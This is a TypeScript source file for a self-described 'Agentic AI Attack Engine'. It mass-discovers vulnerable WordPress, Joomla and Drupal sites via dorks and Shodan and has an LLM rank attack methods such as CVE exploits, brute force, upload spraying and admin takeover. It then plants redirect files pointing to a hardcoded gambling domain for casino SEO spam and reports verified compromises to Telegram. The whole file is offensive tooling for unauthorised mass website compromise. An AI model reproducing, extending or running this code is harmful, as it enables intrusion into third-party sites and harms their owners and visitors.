/**
 * Agentic AI Attack Engine — Fully Autonomous Attack System
 * 
 * The AI does EVERYTHING autonomously:
 *   Phase 1: Discover vulnerable targets (Google dorks, Shodan, NVD CVE matching)
 *   Phase 2: Analyze each target (CMS, WAF, vulns, attack surface)
 *   Phase 3: Attack with ALL methods in priority order until success
 *   Phase 4: Verify success (file placed + redirect working)
 *   Phase 5: Send Telegram notification on verified success only
 *   Phase 6: Move to next target, repeat
 * 
 * Uses ALL existing modules:
 *   - mass-target-discovery (Shodan + SerpAPI)
 *   - wp-vuln-scanner + cms-vuln-scanner
 *   - waf-detector + ai-exploit-generator
 *   - unified-attack-pipeline (full attack)
 *   - one-click-deploy
 *   - telegram-notifier
 */
import { getDb } from "./db";
import { agenticSessions, redirectUrlPool, autonomousDeploys } from "../drizzle/schema";
import { eq, desc, and, sql } from "drizzle-orm";
import { runMassDiscovery, type DiscoveryConfig, type DiscoveredTarget } from "./mass-target-discovery";
import { startBackgroundJob, getJobStatus } from "./job-runner";
import { sendTelegramNotification } from "./telegram-notifier";
import { invokeLLM } from "./_core/llm";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════
export interface AgenticConfig {
  userId: number;
  mode: "full_auto" | "semi_auto" | "discovery_only";
  redirectUrls?: string[];       // Override redirect URLs (otherwise use DB pool)
  targetCms?: string[];          // Filter: only attack these CMS types
  maxTargetsPerRun?: number;     // Max targets to discover (default 50)
  maxConcurrent?: number;        // Max concurrent attacks (default 3)
  seoKeywords?: string[];
  customDorks?: string[];        // Custom Google dork queries
  enableWafBypass?: boolean;
  enableAiExploit?: boolean;
  enableCloaking?: boolean;
}

export interface AgenticEvent {
  phase: string;
  detail: string;
  progress: number;
  timestamp: number;
  data?: Record<string, unknown>;
}

interface AgenticState {
  sessionId: number;
  status: "running" | "paused" | "completed" | "stopped" | "error";
  events: AgenticEvent[];
  abortController: AbortController;
}

// ═══════════════════════════════════════════════════════
//  IN-MEMORY SESSION TRACKING
// ═══════════════════════════════════════════════════════
const activeSessions = new Map<number, AgenticState>();

// ═══════════════════════════════════════════════════════
//  REDIRECT URL POOL MANAGEMENT
// ═══════════════════════════════════════════════════════
const DEFAULT_REDIRECT_URL = "https://hkt956.org/";

export async function getRedirectUrls(): Promise<string[]> {
  try {
    const db = await getDb();
    if (!db) return [DEFAULT_REDIRECT_URL];
    
    const urls = await db.select()
      .from(redirectUrlPool)
      .where(eq(redirectUrlPool.isActive, true))
      .orderBy(desc(redirectUrlPool.weight));
    
    if (urls.length === 0) return [DEFAULT_REDIRECT_URL];
    return urls.map(u => u.url);
  } catch {
    return [DEFAULT_REDIRECT_URL];
  }
}

export async function pickRedirectUrl(urls?: string[]): Promise<string> {
  const pool = urls && urls.length > 0 ? urls : await getRedirectUrls();
  if (pool.length === 0) return DEFAULT_REDIRECT_URL;
  if (pool.length === 1) return pool[0];
  
  // Weighted random selection from DB pool
  try {
    const db = await getDb();
    if (db && (!urls || urls.length === 0)) {
      const dbUrls = await db.select()
        .from(redirectUrlPool)
        .where(eq(redirectUrlPool.isActive, true));
      
      if (dbUrls.length > 0) {
        const totalWeight = dbUrls.reduce((sum, u) => sum + u.weight, 0);
        let random = Math.random() * totalWeight;
        for (const u of dbUrls) {
          random -= u.weight;
          if (random <= 0) {
            // Update lastUsedAt
            await db.update(redirectUrlPool)
              .set({ lastUsedAt: new Date() })
              .where(eq(redirectUrlPool.id, u.id));
            return u.url;
          }
        }
        return dbUrls[0].url;
      }
    }
  } catch { /* fallback */ }
  
  // Simple random from array
  return pool[Math.floor(Math.random() * pool.length)];
}

export async function updateRedirectStats(url: string, success: boolean) {
  try {
    const db = await getDb();
    if (!db) return;
    
    if (success) {
      await db.update(redirectUrlPool)
        .set({ successCount: sql`${redirectUrlPool.successCount} + 1` })
        .where(eq(redirectUrlPool.url, url));
    } else {
      await db.update(redirectUrlPool)
        .set({ failCount: sql`${redirectUrlPool.failCount} + 1` })
        .where(eq(redirectUrlPool.url, url));
    }
  } catch { /* best-effort */ }
}

// ═══════════════════════════════════════════════════════
//  REDIRECT URL CRUD
// ═══════════════════════════════════════════════════════
export async function addRedirectUrl(url: string, label?: string, weight?: number, isDefault?: boolean) {
  const db = await getDb();
  if (!db) throw new Error("DB not available");
  
  // If setting as default, unset all others first
  if (isDefault) {
    await db.update(redirectUrlPool)
      .set({ isDefault: false })
      .where(eq(redirectUrlPool.isDefault, true));
  }
  
  const [result] = await db.insert(redirectUrlPool).values({
    url,
    label: label || new URL(url).hostname,
    weight: weight || 1,
    isDefault: isDefault || false,
    isActive: true,
  });
  
  return { id: (result as any).insertId, url, label, weight };
}

export async function removeRedirectUrl(id: number) {
  const db = await getDb();
  if (!db) throw new Error("DB not available");
  await db.delete(redirectUrlPool).where(eq(redirectUrlPool.id, id));
  return { success: true };
}

export async function listRedirectUrls() {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(redirectUrlPool).orderBy(desc(redirectUrlPool.weight));
}

export async function updateRedirectUrl(id: number, updates: { url?: string; label?: string; weight?: number; isActive?: boolean; isDefault?: boolean }) {
  const db = await getDb();
  if (!db) throw new Error("DB not available");
  
  if (updates.isDefault) {
    await db.update(redirectUrlPool)
      .set({ isDefault: false })
      .where(eq(redirectUrlPool.isDefault, true));
  }
  
  await db.update(redirectUrlPool)
    .set({ ...updates, updatedAt: new Date() })
    .where(eq(redirectUrlPool.id, id));
  return { success: true };
}

// ═══════════════════════════════════════════════════════
//  AI STRATEGY PLANNER — LLM decides attack order
// ═══════════════════════════════════════════════════════
async function aiPlanAttackStrategy(target: DiscoveredTarget): Promise<{
  attackOrder: string[];
  reasoning: string;
  estimatedSuccess: number;
}> {
  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an expert penetration tester AI. Given a target's fingerprint, plan the optimal attack strategy.
Return JSON: { "attackOrder": ["method1", "method2", ...], "reasoning": "...", "estimatedSuccess": 0-100 }
Available methods: "cve_exploit", "wp_brute_force", "cms_plugin_exploit", "file_upload_spray", "config_exploit", "xmlrpc_attack", "rest_api_exploit", "ftp_brute", "webdav_upload", "htaccess_overwrite", "wp_admin_takeover", "shellless_redirect", "ai_generated_exploit"
Prioritize methods most likely to succeed based on the target's CMS, server, and vulnerabilities.`
        },
        {
          role: "user",
          content: JSON.stringify({
            domain: target.domain,
            cms: target.cms,
            cmsVersion: target.cmsVersion,
            serverType: target.serverType,
            phpVersion: target.phpVersion,
            waf: target.waf,
            hasOpenUpload: target.hasOpenUpload,
            hasExposedConfig: target.hasExposedConfig,
            hasExposedAdmin: target.hasExposedAdmin,
            hasWritableDir: target.hasWritableDir,
            hasVulnerableCms: target.hasVulnerableCms,
            hasWeakAuth: target.hasWeakAuth,
            vulnScore: target.vulnScore,
            attackDifficulty: target.attackDifficulty,
          })
        }
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "attack_strategy",
          strict: true,
          schema: {
            type: "object",
            properties: {
              attackOrder: { type: "array", items: { type: "string" } },
              reasoning: { type: "string" },
              estimatedSuccess: { type: "integer" },
            },
            required: ["attackOrder", "reasoning", "estimatedSuccess"],
            additionalProperties: false,
          },
        },
      },
    });
    
    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      return JSON.parse(content);
    }
  } catch (e: any) {
    console.error(`[Agentic] AI strategy planning failed: ${e.message}`);
  }
  
  // Fallback strategy
  return {
    attackOrder: [
      "cve_exploit", "cms_plugin_exploit", "config_exploit",
      "wp_brute_force", "xmlrpc_attack", "rest_api_exploit",
      "file_upload_spray", "ftp_brute", "webdav_upload",
      "ai_generated_exploit", "shellless_redirect"
    ],
    reasoning: "Default priority: CVE exploits first, then CMS-specific, then brute force, then spray",
    estimatedSuccess: 30,
  };
}

// ═══════════════════════════════════════════════════════
//  MAIN: START AGENTIC SESSION
// ═══════════════════════════════════════════════════════
export async function startAgenticSession(config: AgenticConfig): Promise<{ sessionId: number }> {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  
  // Ensure at least one redirect URL exists
  const redirectUrls = config.redirectUrls && config.redirectUrls.length > 0
    ? config.redirectUrls
    : await getRedirectUrls();
  
  // Create session record
  const [result] = await db.insert(agenticSessions).values({
    userId: config.userId,
    status: "running",
    mode: config.mode,
    redirectUrls: redirectUrls,
    targetCms: config.targetCms || null,
    maxTargetsPerRun: config.maxTargetsPerRun || 50,
    maxConcurrent: config.maxConcurrent || 3,
    seoKeywords: config.seoKeywords || ["casino", "slot", "betting"],
    customDorks: config.customDorks || null,
    currentPhase: "initializing",
  } as any);
  
  const sessionId = (result as any).insertId;
  if (!sessionId) throw new Error("Failed to create agentic session");
  
  // Set up abort controller
  const abortController = new AbortController();
  const state: AgenticState = {
    sessionId,
    status: "running",
    events: [],
    abortController,
  };
  activeSessions.set(sessionId, state);
  
  // Run the agentic loop in background
  runAgenticLoop(sessionId, config, redirectUrls, state).catch(async (e) => {
    console.error(`[Agentic] Session ${sessionId} fatal error:`, e.message);
    await updateSessionStatus(sessionId, "error", e.message);
    activeSessions.delete(sessionId);
  });
  
  return { sessionId };
}

// ═══════════════════════════════════════════════════════
//  AGENTIC LOOP — The AI brain that runs everything
// ═══════════════════════════════════════════════════════
async function runAgenticLoop(
  sessionId: number,
  config: AgenticConfig,
  redirectUrls: string[],
  state: AgenticState,
) {
  const signal = state.abortController.signal;
  const maxTargets = config.maxTargetsPerRun || 50;
  const maxConcurrent = config.maxConcurrent || 3;
  
  const emitEvent = async (phase: string, detail: string, progress: number, data?: Record<string, unknown>) => {
    const event: AgenticEvent = { phase, detail, progress, timestamp: Date.now(), data };
    state.events.push(event);
    // Keep only last 500 events in memory
    if (state.events.length > 500) state.events = state.events.slice(-500);
    // Update DB
    try {
      const db = await getDb();
      if (db) {
        await db.update(agenticSessions)
          .set({
            currentPhase: phase,
            lastActivityAt: new Date(),
            eventsLog: state.events.slice(-100),
          })
          .where(eq(agenticSessions.id, sessionId));
      }
    } catch { /* best-effort */ }
  };
  
  try {
    // ═══════════════════════════════════════════════
    // PHASE 1: DISCOVER TARGETS
    // ═══════════════════════════════════════════════
    await emitEvent("discovery", "🔍 Phase 1: AI กำลังค้นหาเป้าหมายที่มีช่องโหว่...", 5);
    
    if (signal.aborted) throw new Error("Session stopped by user");
    
    // Build custom dork queries based on CMS filter
    const customQueries = config.customDorks || [];
    if (config.targetCms?.includes("wordpress")) {
      customQueries.push(
        'inurl:wp-content/uploads intitle:"index of"',
        'inurl:wp-admin/install.php',
        'inurl:wp-content/plugins site:.com',
      );
    }
    if (config.targetCms?.includes("joomla")) {
      customQueries.push(
        'inurl:administrator/index.php "Joomla"',
        'inurl:components/com_media',
      );
    }
    if (config.targetCms?.includes("drupal")) {
      customQueries.push(
        'inurl:user/login "Powered by Drupal"',
        'inurl:sites/default/files',
      );
    }
    
    const discoveryConfig: DiscoveryConfig = {
      useShodan: true,
      useSerpApi: true,
      customQueries: customQueries.length > 0 ? customQueries : undefined,
      minVulnScore: 25,
      maxTargets: maxTargets,
      targetCms: config.targetCms,
      onProgress: (phase, detail, progress) => {
        emitEvent("discovery", `🔍 ${detail}`, Math.min(25, 5 + progress * 0.2));
      },
    };
    
    let discoveryResult;
    try {
      discoveryResult = await runMassDiscovery(discoveryConfig);
    } catch (e: any) {
      await emitEvent("discovery", `⚠️ Discovery error: ${e.message}`, 10);
      discoveryResult = { targets: [], errors: [e.message], totalQueriesRun: 0, totalRawResults: 0, totalAfterDedup: 0, totalAfterFilter: 0, totalScored: 0, id: "", startedAt: Date.now(), status: "error" as const };
    }
    
    const targets = discoveryResult.targets
      .sort((a, b) => b.vulnScore - a.vulnScore) // Highest vuln score first
      .slice(0, maxTargets);
    
    await emitEvent("discovery", `✅ ค้นพบ ${targets.length} เป้าหมาย (จาก ${discoveryResult.totalRawResults} ผลลัพธ์ดิบ)`, 25, {
      totalFound: targets.length,
      totalRaw: discoveryResult.totalRawResults,
      topTargets: targets.slice(0, 5).map(t => ({ domain: t.domain, cms: t.cms, score: t.vulnScore })),
    });
    
    // Update session stats
    try {
      const db = await getDb();
      if (db) {
        await db.update(agenticSessions)
          .set({ targetsDiscovered: targets.length })
          .where(eq(agenticSessions.id, sessionId));
      }
    } catch { /* best-effort */ }
    
    if (targets.length === 0) {
      await emitEvent("complete", "❌ ไม่พบเป้าหมายที่มีช่องโหว่ — ลองเปลี่ยน dork queries หรือ CMS filter", 100);
      await updateSessionStatus(sessionId, "completed", "No targets found");
      return;
    }
    
    if (config.mode === "discovery_only") {
      await emitEvent("complete", `✅ Discovery Only — พบ ${targets.length} เป้าหมาย`, 100, {
        targets: targets.map(t => ({ domain: t.domain, cms: t.cms, score: t.vulnScore, difficulty: t.attackDifficulty })),
      });
      await updateSessionStatus(sessionId, "completed", `Found ${targets.length} targets`);
      return;
    }
    
    // ═══════════════════════════════════════════════
    // PHASE 2-5: ATTACK EACH TARGET
    // ═══════════════════════════════════════════════
    let successCount = 0;
    let failCount = 0;
    let attackedCount = 0;
    
    // Process targets in batches of maxConcurrent
    for (let i = 0; i < targets.length; i += maxConcurrent) {
      if (signal.aborted) throw new Error("Session stopped by user");
      
      const batch = targets.slice(i, i + maxConcurrent);
      const batchNum = Math.floor(i / maxConcurrent) + 1;
      const totalBatches = Math.ceil(targets.length / maxConcurrent);
      
      await emitEvent("attacking", `⚔️ Batch ${batchNum}/${totalBatches}: กำลังโจมตี ${batch.length} เป้าหมาย...`, 25 + (i / targets.length) * 65, {
        batch: batchNum,
        targets: batch.map(t => t.domain),
      });
      
      // Attack each target in the batch concurrently
      const batchPromises = batch.map(async (target) => {
        if (signal.aborted) return { target, success: false, reason: "stopped" };
        
        try {
          return await attackSingleTarget(sessionId, target, config, redirectUrls, state, emitEvent);
        } catch (e: any) {
          return { target, success: false, reason: e.message };
        }
      });
      
      const batchResults = await Promise.all(batchPromises);
      
      for (const result of batchResults) {
        attackedCount++;
        if (result.success) {
          successCount++;
        } else {
          failCount++;
        }
      }
      
      // Update session stats
      try {
        const db = await getDb();
        if (db) {
          await db.update(agenticSessions)
            .set({
              targetsAttacked: attackedCount,
              targetsSucceeded: successCount,
              targetsFailed: failCount,
              lastActivityAt: new Date(),
            })
            .where(eq(agenticSessions.id, sessionId));
        }
      } catch { /* best-effort */ }
      
      // Small delay between batches
      if (i + maxConcurrent < targets.length) {
        await new Promise(resolve => setTimeout(resolve, 3000));
      }
    }
    
    // ═══════════════════════════════════════════════
    // PHASE 6: COMPLETE — SUMMARY
    // ═══════════════════════════════════════════════
    const summaryText = `🏁 Agentic Attack Complete!\n` +
      `📊 ${attackedCount} targets attacked\n` +
      `✅ ${successCount} succeeded (${Math.round(successCount / Math.max(attackedCount, 1) * 100)}%)\n` +
      `❌ ${failCount} failed`;
    
    await emitEvent("complete", summaryText, 100, {
      totalAttacked: attackedCount,
      totalSucceeded: successCount,
      totalFailed: failCount,
      successRate: Math.round(successCount / Math.max(attackedCount, 1) * 100),
    });
    
    await updateSessionStatus(sessionId, "completed", summaryText);
    
    // Send summary to Telegram if there were successes
    if (successCount > 0) {
      try {
        await sendTelegramNotification({
          type: "success",
          targetUrl: `Agentic Session #${sessionId}`,
          redirectUrl: redirectUrls[0] || DEFAULT_REDIRECT_URL,
          deployedUrls: [],
          shellType: "redirect_php",
          duration: Date.now() - (state.events[0]?.timestamp || Date.now()),
          errors: [],
          keywords: config.seoKeywords || [],
          cloakingEnabled: false,
          injectedFiles: successCount,
          details: `🤖 AGENTIC AI SUMMARY\n${summaryText}`,
        });
      } catch { /* best-effort */ }
    }
    
  } catch (e: any) {
    if (e.message === "Session stopped by user") {
      await emitEvent("stopped", "⏹️ Session หยุดโดยผู้ใช้", 100);
      await updateSessionStatus(sessionId, "stopped", "Stopped by user");
    } else {
      await emitEvent("error", `❌ Fatal error: ${e.message}`, 100);
      await updateSessionStatus(sessionId, "error", e.message);
    }
  } finally {
    activeSessions.delete(sessionId);
  }
}

// ═══════════════════════════════════════════════════════
//  ATTACK SINGLE TARGET — Full autonomous attack
// ═══════════════════════════════════════════════════════
async function attackSingleTarget(
  sessionId: number,
  target: DiscoveredTarget,
  config: AgenticConfig,
  redirectUrls: string[],
  state: AgenticState,
  emitEvent: (phase: string, detail: string, progress: number, data?: Record<string, unknown>) => Promise<void>,
): Promise<{ target: DiscoveredTarget; success: boolean; reason: string; deployId?: number; deployedUrls?: string[] }> {
  
  // Pick a redirect URL for this target (rotation)
  const redirectUrl = await pickRedirectUrl(redirectUrls);
  
  await emitEvent("attacking", `🎯 โจมตี ${target.domain} (CMS: ${target.cms || "unknown"}, Score: ${target.vulnScore})`, 0, {
    domain: target.domain,
    cms: target.cms,
    vulnScore: target.vulnScore,
    redirectUrl,
  });
  
  // Phase 2: AI plans attack strategy
  const strategy = await aiPlanAttackStrategy(target);
  await emitEvent("attacking", `🧠 AI วางแผน: ${strategy.reasoning.substring(0, 100)}... (${strategy.estimatedSuccess}% chance)`, 0, {
    domain: target.domain,
    strategy: strategy.attackOrder,
  });
  
  // Phase 3: Launch attack via background job (uses unified pipeline)
  try {
    const jobResult = await startBackgroundJob({
      userId: config.userId,
      targetDomain: target.url || `https://${target.domain}`,
      redirectUrl,
      mode: "emergent",
      maxIterations: 5,
      seoKeywords: config.seoKeywords || ["casino", "slot", "betting"],
      enableCloaking: config.enableCloaking,
      methodPriority: strategy.attackOrder.map(m => ({ id: m, enabled: true })),
    });
    
    const deployId = jobResult.deployId;
    
    // Phase 4: Wait for job to complete (poll status)
    const maxWaitMs = 5 * 60 * 1000; // 5 minutes max per target
    const pollInterval = 5000; // 5 seconds
    const startTime = Date.now();
    
    while (Date.now() - startTime < maxWaitMs) {
      if (state.abortController.signal.aborted) {
        return { target, success: false, reason: "stopped", deployId };
      }
      
      await new Promise(resolve => setTimeout(resolve, pollInterval));
      
      const status = await getJobStatus(deployId);
      if (!status) continue;
      
      if (status.status === "success") {
        const verifiedUrls = (status.verifiedUrls as string[]) || [];
        
        // Update redirect stats
        await updateRedirectStats(redirectUrl, true);
        
        // Update session stats
        try {
          const db = await getDb();
          if (db) {
            await db.update(agenticSessions)
              .set({ totalRedirectsPlaced: sql`${agenticSessions.totalRedirectsPlaced} + ${verifiedUrls.length}` })
              .where(eq(agenticSessions.id, sessionId));
          }
        } catch { /* best-effort */ }
        
        await emitEvent("success", `✅ ${target.domain} — สำเร็จ! ${verifiedUrls.length} files placed, redirect → ${redirectUrl}`, 0, {
          domain: target.domain,
          deployId,
          verifiedUrls,
          redirectUrl,
        });
        
        return { target, success: true, reason: "verified", deployId, deployedUrls: verifiedUrls };
      }
      
      if (status.status === "failed" || status.status === "partial") {
        await updateRedirectStats(redirectUrl, false);
        const phase = status.liveProgress?.phase || "unknown";
        
        await emitEvent("failed", `❌ ${target.domain} — ${status.status}: ${phase}`, 0, {
          domain: target.domain,
          deployId,
          status: status.status,
        });
        
        return { target, success: false, reason: status.status, deployId };
      }
      
      // Still running — emit progress
      if (status.liveProgress?.phase) {
        await emitEvent("attacking", `⚔️ ${target.domain} — ${status.liveProgress.phase} (${status.liveProgress.progress || 0}%)`, 0, {
          domain: target.domain,
          deployId,
          phase: status.liveProgress.phase,
          progress: status.liveProgress.progress,
        });
      }
    }
    
    // Timeout
    await updateRedirectStats(redirectUrl, false);
    return { target, success: false, reason: "timeout", deployId };
    
  } catch (e: any) {
    await emitEvent("failed", `❌ ${target.domain} — Error: ${e.message}`, 0);
    return { target, success: false, reason: e.message };
  }
}

// ═══════════════════════════════════════════════════════
//  SESSION MANAGEMENT
// ═══════════════════════════════════════════════════════
async function updateSessionStatus(sessionId: number, status: string, detail?: string) {
  try {
    const db = await getDb();
    if (!db) return;
    
    const updates: Record<string, any> = {
      status,
      lastActivityAt: new Date(),
    };
    if (status === "completed" || status === "stopped" || status === "error") {
      updates.completedAt = new Date();
    }
    if (detail) {
      updates.currentPhase = detail.substring(0, 128);
    }
    
    await db.update(agenticSessions)
      .set(updates)
      .where(eq(agenticSessions.id, sessionId));
  } catch { /* best-effort */ }
}

export async function stopAgenticSession(sessionId: number): Promise<{ success: boolean }> {
  const state = activeSessions.get(sessionId);
  if (state) {
    state.abortController.abort();
    state.status = "stopped";
    activeSessions.delete(sessionId);
  }
  await updateSessionStatus(sessionId, "stopped", "Stopped by user");
  return { success: true };
}

export async function getAgenticSessionStatus(sessionId: number) {
  const db = await getDb();
  if (!db) return null;
  
  const [session] = await db.select()
    .from(agenticSessions)
    .where(eq(agenticSessions.id, sessionId));
  
  if (!session) return null;
  
  // Merge in-memory events if session is still active
  const memState = activeSessions.get(sessionId);
  const events = memState ? memState.events.slice(-100) : (session.eventsLog as AgenticEvent[] || []);
  
  return {
    ...session,
    isRunning: !!memState,
    events,
  };
}

export async function listAgenticSessions(userId: number, page = 1, limit = 20) {
  const db = await getDb();
  if (!db) return { items: [], total: 0 };
  
  const [items, [countResult]] = await Promise.all([
    db.select()
      .from(agenticSessions)
      .where(eq(agenticSessions.userId, userId))
      .orderBy(desc(agenticSessions.createdAt))
      .limit(limit)
      .offset((page - 1) * limit),
    db.select({ count: sql<number>`count(*)` })
      .from(agenticSessions)
      .where(eq(agenticSessions.userId, userId)),
  ]);
  
  return { items, total: countResult?.count || 0 };
}

export function getActiveSessionCount(): number {
  return activeSessions.size;
}

// ═══════════════════════════════════════════════════════
//  SEED DEFAULT REDIRECT URL
// ═══════════════════════════════════════════════════════
export async function seedDefaultRedirectUrl() {
  try {
    const db = await getDb();
    if (!db) return;
    
    const existing = await db.select().from(redirectUrlPool).limit(1);
    if (existing.length === 0) {
      await db.insert(redirectUrlPool).values({
        url: DEFAULT_REDIRECT_URL,
        label: "hkt956.org (Default)",
        weight: 10,
        isActive: true,
        isDefault: true,
      });
      console.log("[Agentic] Seeded default redirect URL: " + DEFAULT_REDIRECT_URL);
    }
  } catch (e: any) {
    console.error("[Agentic] Failed to seed default redirect:", e.message);
  }
}
